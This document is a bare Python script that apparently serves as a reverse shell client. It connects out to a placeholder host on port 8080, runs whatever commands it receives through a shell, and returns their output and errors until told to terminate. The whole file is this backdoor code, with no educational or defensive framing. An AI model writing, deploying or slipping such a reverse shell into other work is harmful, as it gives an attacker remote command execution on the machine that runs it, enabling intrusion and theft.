import socket 
import subprocess 
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    s.connect(('IP Here', 8080)) #connect to the remote server
    while True:
        command = s.recv(1024) 
        if 'terminate' in command:
            s.close()
            break
        else: 
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read() ) # send back the result
            s.send( CMD.stderr.read() ) # send back the error

def main ():
    connect()
main()
